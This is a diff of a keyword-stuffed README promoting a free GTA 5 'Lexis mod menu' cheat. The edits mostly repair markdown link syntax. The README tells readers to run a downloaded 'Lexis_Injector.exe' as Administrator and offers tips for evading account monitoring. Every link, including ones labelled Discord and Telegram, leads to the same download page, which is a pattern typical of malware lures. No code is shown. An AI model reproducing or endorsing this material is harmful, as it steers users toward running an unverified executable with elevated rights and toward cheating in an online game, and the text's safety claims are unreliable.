@@ -11,11 +11,10 @@ Welcome to the ultimate home of the **lexis mod menu gta 5**, the most sophistic
 
 <div align="center">
 
-[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)]https://lexis-devs.github.io/lexis-mod-menu/)
+[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://lexis-devs.github.io/lexis-mod-menu/)
 
 </div> 
 
-<img width="1280" height="720" alt="Lexis Mod Menu" src="https://github.com/user-attachments/assets/5ddccc3e-dfb7-42df-b4fb-2df77add63b8" />
 
 The **lexis mod menu gta** ecosystem is built to solve the tedious grind associated with modern open-world gaming. By offering a high-performance **lexis mod menu free version**, we ensure that every player can access professional-grade features such as instant teleportation, vehicle spawning, and advanced protection systems without spending a dime.
 
@@ -46,7 +45,7 @@ Experience the power of the most advanced **lexis mod menu for gta 5** with thes
 
 🎮 **Intuitive UI** - A clean, high-performance overlay designed specifically for **lexis mod menu gta 5 enhanced** editions.
 
-[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)]https://lexis-devs.github.io/lexis-mod-menu/)
+[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://lexis-devs.github.io/lexis-mod-menu/)
 
 ***
 
@@ -91,7 +90,7 @@ Players frequently ask **is lexis mod menu safe**? Our track record proves that 
 4. **Injection:** Start GTA 5, and once in the main menu, run the `Lexis_Injector.exe` as Administrator.
 5. **Activation:** Press `F4` or `INS` in-game to toggle the menu overlay.
 
-[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)]https://lexis-devs.github.io/lexis-mod-menu/)
+[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://lexis-devs.github.io/lexis-mod-menu/)
 
 ***
 
@@ -126,7 +125,7 @@ Account longevity is key when using any **lexis mod menu gta** tool. Follow thes
 3. **Stay Updated:** Always check for the latest **lexis mod menu gta 5 download** before joining an online session.
 4. **Clear Cache:** Periodically clear your game cache and logs if you feel your account is being monitored.
 
-[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)]https://lexis-devs.github.io/lexis-mod-menu/)
+[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://lexis-devs.github.io/lexis-mod-menu/)
 
 ***
 
@@ -159,15 +158,15 @@ No, the **lexis mod menu gta** is currently only compatible with Windows PC plat
 
 The **lexis mod menu gta 5** is the definitive choice for players who demand power, stability, and security. With our **lexis mod menu free version**, you can experience the best that Los Santos has to offer without any barriers. Download the latest **lexis gta mod menu download** today and join thousands of satisfied users in the ultimate GTA playground.
 
-[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)]https://lexis-devs.github.io/lexis-mod-menu/)
+[![Download Lexis Mod Menu](https://img.shields.io/badge/Download%20Lexis%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://lexis-devs.github.io/lexis-mod-menu/)
 
 ***
 
 ## 📞 Follow Us
 
-- 💬 **Discord:** [Join the Lexis Community]https://lexis-devs.github.io/lexis-mod-menu/)
-- 📱 **Telegram:** [Update Notifications]https://lexis-devs.github.io/lexis-mod-menu/)
-- 🌐 **Website:** [Official Lexis Portal]https://lexis-devs.github.io/lexis-mod-menu/)
+- 💬 **Discord:** [Join the Lexis Community](https://lexis-devs.github.io/lexis-mod-menu/)
+- 📱 **Telegram:** [Update Notifications](https://lexis-devs.github.io/lexis-mod-menu/)
+- 🌐 **Website:** [Official Lexis Portal](https://lexis-devs.github.io/lexis-mod-menu/)
 
 ***
 *Developed by the Lexis Team. Use responsibly.*
